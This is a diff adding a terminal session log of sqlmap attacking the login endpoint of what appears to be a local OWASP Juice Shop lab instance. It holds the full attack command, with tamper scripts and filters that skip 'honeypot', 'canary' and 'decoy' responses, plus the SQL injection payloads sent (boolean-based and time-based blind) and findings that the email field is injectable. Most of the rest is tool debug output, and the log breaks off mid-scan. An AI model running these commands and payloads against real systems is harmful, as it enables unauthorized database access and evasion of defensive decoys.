@@ -1,0 +1,633 @@
+Script started on 2026-04-25 16:43:07+05:00 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="120" LINES="15"]
+0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ exisqlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3 --risk 3 --level 3 --tamper=space2comment,between,randomcase --answers "problem=Y
+ - -- --a --an --ans --answ --answe --answer --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" --answers "problem=Y" 
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.3#pip}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:43:21 /2026-04-25/
+
+[16:43:21] [DEBUG] cleaning up configuration parameters
+[16:43:21] [DEBUG] setting the HTTP timeout
+[16:43:21] [DEBUG] setting extra HTTP headers
+[16:43:21] [DEBUG] setting the HTTP User-Agent header
+[16:43:21] [DEBUG] creating HTTP requests opener object
+[16:43:21] [DEBUG] forcing back-end DBMS to user defined value
+[16:43:21] [DEBUG] setting the HTTP Referer header to the target URL
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[16:43:21] [DEBUG] used the default behavior, running in batch mode
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[16:43:21] [DEBUG] used the default behavior, running in batch mode
+[16:43:21] [INFO] flushing session file
+[16:43:21] [DEBUG] resolving hostname 'localhost'
+[16:43:21] [INFO] testing connection to the target URL
+[16:43:21] [DEBUG] declared web page charset 'utf-8'
+[16:43:21] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[16:43:21] [PAYLOAD] 6363
+[16:43:21] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[16:43:21] [PAYLOAD] admin@juice-sh.op")),('((.,
+[16:43:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:21] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[16:43:21] [PAYLOAD] admin@juice-sh.op'QELVEy<'">chBCkD
+[16:43:21] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:21] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[16:43:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:43:21] [PAYLOAD] admin@juice-sh.op) AND 3895=7033-- TqYE
+[16:43:21] [PAYLOAD] admin@juice-sh.op) AND 6781=6781-- JqRx
+[16:43:21] [PAYLOAD] admin@juice-sh.op' AND 3402=5185-- ywVu
+[16:43:21] [PAYLOAD] admin@juice-sh.op' AND 6781=6781-- BKWi
+[16:43:21] [PAYLOAD] admin@juice-sh.op' AND 9276=5220-- xZWm
+[16:43:21] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[16:43:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:21] [INFO] testing 'Generic inline queries'
+[16:43:21] [PAYLOAD] (SELECT CONCAT(CONCAT(CHAR(113,122,112,112,113),(CASE WHEN (2912=2912) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113,113,106,107,113)))
+[16:43:21] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[16:43:21] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the payload for boolean-based blind has already been identified
+[16:43:21] [INFO] testing 'SQLite inline queries'
+[16:43:21] [PAYLOAD] SELECT CHAR(113,122,112,112,113)||(CASE WHEN (9322=9322) THEN 1 ELSE 0 END)||CHAR(113,113,106,107,113)
+[16:43:21] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[16:43:21] [PAYLOAD] admin@juice-sh.op';SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
+[16:43:21] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)   
+[16:43:22] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the level (5) is higher than the provided (3)
+[16:43:22] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[16:43:22] [PAYLOAD] admin@juice-sh.op' AND 1737=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- zdpe
+[16:43:23] [PAYLOAD] admin@juice-sh.op' AND 1737=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(000000000/2))))-- zdpe
+[16:43:23] [PAYLOAD] admin@juice-sh.op' AND 1737=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- zdpe
+[16:43:25] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) value? [Y/n] Y
+[16:43:25] [DEBUG] used the default behavior, running in batch mode
+[16:43:25] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SQLite > 2.0 AND time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SQLite > 2.0 OR time-based blind (heavy query - comment)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)' because the payload for time-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the payload for boolean-based blind has already been identified
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle error-based - Parameter replace' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird error-based - Parameter replace' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 error-based - Parameter replace' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - ORDER BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle error-based - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird error-based - ORDER BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'IBM DB2 error-based - ORDER BY clause' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Firebird inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'ClickHouse inline queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (BENCHMARK)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries (comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[16:43:25] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because its declared DBMS is different than provided
